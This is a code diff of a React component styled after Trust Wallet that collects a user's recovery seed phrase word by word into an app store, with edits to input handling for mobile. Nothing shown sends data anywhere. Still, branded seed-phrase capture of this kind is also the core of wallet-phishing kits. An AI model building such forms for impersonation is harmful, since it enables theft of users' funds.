@@ -1,13 +1,13 @@
+"use client";
+
 import { useRef, useState } from "react";
 import { X, Eye, EyeOff } from "lucide-react";
-
 import { Input } from "@/components/ui/input";
 import { useWalletStore } from "@/store/walletStore";
 import TrustWalletFull from "../icons/trust-wallet-full";
 
 const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 	const [walletName, setWalletName] = useState("Main wallet");
-
 	const [words, setWords] = useState<string[]>([""]);
 	const [visibility, setVisibility] = useState<boolean[]>([false]);
 	const [allVisible, setAllVisible] = useState(false);
@@ -16,6 +16,7 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 	const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 	const { setSeedPhrase } = useWalletStore();
 
+	// Handle completion
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
 		setWalletName(walletName);
@@ -33,16 +34,14 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 		}
 	};
 
-	// Handle typing within each input
-	const handleInput = (
+	// Handle typing within each input (keyboard only)
+	const handleKeyDown = (
 		e: React.KeyboardEvent<HTMLInputElement>,
 		index: number
 	) => {
 		if (e.key === " ") {
 			e.preventDefault();
-			if (words[index].trim() !== "") {
-				addNewInput();
-			}
+			if (words[index].trim() !== "") addNewInput();
 		} else if (e.key === "Backspace" && words[index] === "" && index > 0) {
 			e.preventDefault();
 			setWords((prev) => prev.filter((_, i) => i !== index));
@@ -53,23 +52,31 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 		}
 	};
 
-	// Handle typing value change
-	const handleChange = (value: string, index: number) => {
+	// Handle input change (works for both desktop & mobile)
+	const handleInput = (e: React.FormEvent<HTMLInputElement>, index: number) => {
+		const value = e.currentTarget.value;
+
+		// If a space is typed (mobile-friendly)
+		if (value.endsWith(" ")) {
+			if (words[index].trim() !== "") addNewInput();
+			return;
+		}
+
+		// Handle normal typing
 		setWords((prev) => prev.map((w, i) => (i === index ? value : w)));
 	};
 
-	// Toggle input visibility for all
+	// Toggle all visibility
 	const toggleAllVisibility = () => {
 		const newVisible = !allVisible;
 		setAllVisible(newVisible);
 		setVisibility((prev) => prev.map(() => newVisible));
 	};
 
-	// Focus last input when the custom area is clicked
+	// Handle area click
 	const handleAreaClick = (e: React.MouseEvent<HTMLDivElement>) => {
 		const target = e.target as HTMLElement;
-		if (target.closest("input")) return;
-		if (target.closest("button")) return;
+		if (target.closest("input") || target.closest("button")) return;
 
 		if (words.length === 0) {
 			setWords([""]);
@@ -107,7 +114,7 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 						<div>
 							<label className="block font-semibold mb-2">Wallet Name</label>
 							<div
-								className={`relative border  rounded-lg  ${
+								className={`relative border rounded-lg ${
 									nameFocused ? "border-green-600" : "border-neutral-700"
 								}`}
 							>
@@ -157,8 +164,8 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 											}}
 											type={visibility[index] ? "text" : "password"}
 											value={word}
-											onChange={(e) => handleChange(e.target.value, index)}
-											onKeyDown={(e) => handleInput(e, index)}
+											onInput={(e) => handleInput(e, index)} // ✅ Mobile & desktop compatible
+											onKeyDown={(e) => handleKeyDown(e, index)} // ✅ Handles desktop keys
 											style={{
 												width: `${Math.max(word.length, 1)}ch`,
 											}}
